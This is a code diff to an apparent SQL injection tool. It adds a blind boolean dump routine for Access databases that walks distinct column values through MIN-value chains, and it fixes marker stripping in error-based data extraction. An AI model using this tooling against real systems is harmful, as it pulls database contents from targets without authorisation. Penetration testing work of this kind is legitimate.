@@ -57,6 +57,12 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
 
         public async Task GetDataByBool(AppConfig config)
         {
+            //MIN 值链分页（Access）：Jet 标量子查询 TOP+ORDER BY 并列语义导致行索引分页不可用，走 sqlmap 风格值链
+            if (PayloadFactory.BPTool.MinValueChainPaging)
+            {
+                await GetDataByBoolValueChain(config).ConfigureAwait(false);
+                return;
+            }
 
             string countPaylaod = PayloadFactory.BPTool.GetDataCount(DBName, TableName, config.DataDump.DumpWhere);
             int count= await DataComm.GetValueLen(config, countPaylaod, 0, 65556).ConfigureAwait(false);
@@ -114,6 +120,68 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
             DumpProgress.Complete(boolKey);
 
+        }
+
+        /// <summary>
+        /// MIN 值链盲注 dump（Access 专用）：Jet 标量子查询中 TOP+ORDER BY 对并列值返回多行报错，
+        /// 行索引分页不可用（docker/ODBC 实测），改用 sqlmap 风格 MIN(col)&gt;last 值链。
+        /// 逐列顺序取回 distinct 值（重复值折叠，与 sqlmap 同语义），按最长列对齐装配行；
+        /// 断点续传/start 偏移通过从头重放链跳过（盲取成本不可避免，仅不落行）。
+        /// </summary>
+        private async Task GetDataByBoolValueChain(AppConfig config)
+        {
+            int start = config.DataDump.DataDumpStart;
+            int dumpCount = config.DataDump.DumpCount; //0=全量
+            var columnValues = new List<(string col, List<string> vals)>();
+            foreach (string col in Columns)
+            {
+                config.CheckStop();
+                var dp = new DumpDataParam(new List<string> { col }, DBName, TableName, 0);
+                dp.Where = config.DataDump.DumpWhere;
+                dp.NoCast = config.DataDump.DumpNoCast;
+                int count = await DataComm.GetValueLen(config, PayloadFactory.BPTool.DataCountDistinct(dp), 0, 65535).ConfigureAwait(false);
+                if (count <= 0)
+                {
+                    Log.Warning($"表{TableName}列{col} distinct 计数为 0，跳过该列");
+                    columnValues.Add((col, new List<string>()));
+                    continue;
+                }
+                int target = dumpCount <= 0 ? count : Math.Min(count, start + dumpCount);
+                Log.Show($"表{TableName}列{col}共 {count} 个distinct值（MIN值链取值，重复值折叠）");
+                var vals = new List<string>();
+                string? last = null;
+                for (int i = 0; i < target; i++)
+                {
+                    config.CheckStop();
+                    Log.SysLog($"开始获取表{TableName},列:{col}的第 {i + 1} 个distinct值");
+                    string payload = PayloadFactory.BPTool.DataValueChain(dp, last);
+                    //多字节安全的盲注取值（unicodechar/ascw），内部通过stp并行取字符
+                    string val = (await DataComm.GetStringByBool(config, payload, 4096).ConfigureAwait(false)) ?? "";
+                    if (string.IsNullOrEmpty(val))
+                    {
+                        break; //链终止（MIN 返回 NULL / 空串）
+                    }
+                    if (i >= start)
+                    {
+                        vals.Add(val);
+                    }
+                    last = val;
+                }
+                columnValues.Add((col, vals));
+            }
+            //按最长列对齐装配行，短列补空
+            int rowCount = columnValues.Count > 0 ? columnValues.Max(c => c.vals.Count) : 0;
+            for (int r = 0; r < rowCount; r++)
+            {
+                config.CheckStop();
+                var row = new DynamicDataItem();
+                WeakReferenceMessenger.Default.Send(new AddRowDataMsg { Data = row });
+                foreach (var (col, vals) in columnValues)
+                {
+                    row.Add(col, r < vals.Count ? vals[r] : "");
+                }
+            }
+            Log.Success($"MIN值链取数完成：{rowCount} 行（distinct 语义，重复值已折叠）");
         }
 
         /// <summary>中文识别（--hex）开启时，取数列逐字段 HEX(CAST) 包装（回显纯ASCII，客户端按DbEncoding逐字段解码还原）</summary>
@@ -295,6 +363,16 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     s += step;
                 }
                 string datas = sb.ToString();
+                //报错分片是原样拼接（含行首data_与行尾_data标记），拆分列前必须先剥离起止标记，
+                //否则首列残留"data_"、整体列错位且末列丢失；截断场景结束标记可能已被服务器截掉，EndsWith判断兼容
+                if (datas.StartsWith(EchoMarkers.Start, StringComparison.Ordinal))
+                {
+                    datas = datas.Substring(EchoMarkers.Start.Length);
+                }
+                if (datas.EndsWith(EchoMarkers.End, StringComparison.Ordinal))
+                {
+                    datas = datas.Substring(0, datas.Length - EchoMarkers.End.Length);
+                }
                 string[] values = datas.Split(EchoMarkers.Split, StringSplitOptions.RemoveEmptyEntries);
 
                 if (values != null && values.Length > 0)
